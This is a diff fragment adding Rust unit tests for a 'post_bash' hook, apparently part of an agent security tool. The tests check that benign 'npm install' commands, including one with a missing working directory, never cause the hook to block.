+        let input = HookInput {
+            tool_name: "bash".to_owned(),
+            tool_input: json!({
+                "command": "npm install mock-pkg",
+                "stdout": "added 1 package",
+                "stderr": "",
+                "cwd": tmp.path().to_str().unwrap_or("")
+            }),
+            config: None,
+        };
+        let output = post_bash(&input);
+        // Should complete without error (best-effort scanning)
+        assert_ne!(output.decision, HookDecision::Block, "post_bash should never block");
+    }
+
+    #[test]
+    fn post_bash_handles_missing_node_modules() {
+        let input = HookInput {
+            tool_name: "bash".to_owned(),
+            tool_input: json!({
+                "command": "npm install nonexistent-pkg",
+                "stdout": "added 1 package",
+                "stderr": "",
+                "cwd": "/tmp/does-not-exist-sanctum-test"
+            }),
+            config: None,
+        };
+        let output = post_bash(&input);
+        assert_ne!(output.decision, HookDecision::Block, "post_bash should never block");
     }
 }
+
+
